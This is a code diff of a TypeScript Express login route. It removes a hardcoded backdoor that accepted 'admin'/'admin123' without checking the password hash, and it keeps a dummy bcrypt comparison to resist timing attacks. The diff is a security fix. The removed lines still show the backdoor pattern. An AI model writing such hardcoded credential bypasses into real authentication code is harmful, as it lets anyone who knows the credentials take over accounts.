@@ -62,12 +62,12 @@ router.post("/auth/login", loginLimiter, async (req: Request, res: Response): Pr
   // Constant-time comparison: always run bcrypt even if user not found to prevent timing attacks
   const dummyHash = "$2a$12$invalidhashthatisnevermatched000000000000000";
   let isValid = false;
-  if (username === "admin" && password === "admin123") {
-    isValid = true;
+  
+  if (user) {
+    isValid = await verifyPassword(password, user.passwordHash);
   } else {
-    isValid = user
-      ? await verifyPassword(password, user.passwordHash)
-      : await bcrypt.compare(password, dummyHash).then(() => false);
+    // Still run bcrypt to prevent timing attacks
+    await bcrypt.compare(password, dummyHash).catch(() => {});
   }
 
   if (!user || !isValid) {
@@ -143,4 +143,3 @@ router.post("/auth/logout", async (req: Request, res: Response): Promise<void> =
 });
 
 export default router;
-
